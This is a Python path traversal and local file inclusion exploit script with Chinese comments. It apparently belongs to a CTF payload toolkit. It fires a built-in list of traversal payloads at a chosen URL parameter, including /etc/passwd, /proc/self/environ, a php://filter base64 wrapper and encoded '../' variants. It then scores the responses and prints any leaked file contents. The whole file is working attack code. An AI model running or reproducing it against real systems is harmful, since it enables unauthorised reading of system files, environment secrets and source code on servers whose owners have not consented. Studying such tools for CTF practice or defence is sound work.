#!/usr/bin/env python3
"""目录穿越 / LFI 利用：探测可读文件 + 敏感文件提取。

用法：
    python3 arsenal/payloads/path_traversal.py --url 'http://host/download.php?file=' --param file
    python3 arsenal/payloads/path_traversal.py --url 'http://host/page.php' --param page --file '/etc/passwd'

成功：输出敏感文件内容；失败：输出响应差异摘要。
"""
import argparse
import requests
import sys


TARGETS = [
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "../flag.txt",
    "../../flag.txt",
    "../../../flag.txt",
    "....//....//....//flag.txt",
    "..%2f..%2f..%2fflag.txt",
    "/proc/self/environ",
    "php://filter/read=convert.base64-encode/resource=flag.php",
    "file:///etc/passwd",
]


def _probe(url, method, headers, data, param, payload, timeout=15):
    d = (data or "").copy() if data else {}
    if param in d:
        d[param] = payload
    kwargs = {"url": url, "method": method, "headers": headers or {}, "timeout": timeout, "verify": False}
    if method.upper() == "GET":
        kwargs["params"] = {param: payload}
        kwargs["data"] = None
    else:
        kwargs["data"] = d or {param: payload}
    try:
        r = requests.request(**kwargs)
        return r.status_code, len(r.content), r.text
    except Exception as e:
        return -1, 0, str(e)


def main():
    parser = argparse.ArgumentParser(description="目录穿越 / LFI 利用脚本")
    parser.add_argument("--url", required=True)
    parser.add_argument("--param", required=True)
    parser.add_argument("--file", default="", help="指定要读取的文件路径")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data", default="")
    parser.add_argument("--headers", default="", help="JSON 字符串")
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    import json
    headers = json.loads(args.headers) if args.headers else {}
    data = {k: v for k, v in (p.split("=", 1) for p in args.data.split("&") if p)} if args.data else {}

    targets = [args.file] if args.file else TARGETS

    for f in targets:
        for enc in [f, f.replace("/", "../"), f.replace("/", "..%2f"), f"....//{f}"]:
            status, length, text = _probe(args.url, args.method, headers, data, args.param, enc, args.timeout)
            indicators = ["root:", "[extensions]", "flag", "<?php", "DATABASE", "PATH="]
            score = sum(1 for ind in indicators if ind.lower() in text.lower())
            print(f"[try] {enc!r:50} status={status} len={length} indicators={score}")
            if score > 0:
                print(f"[hit]\n{text[:2000]}")
                if "flag" in text.lower() or "flag{" in text.lower():
                    return 0
    print("[verdict] 未读到敏感文件")
    return 1


if __name__ == "__main__":
    sys.exit(main())
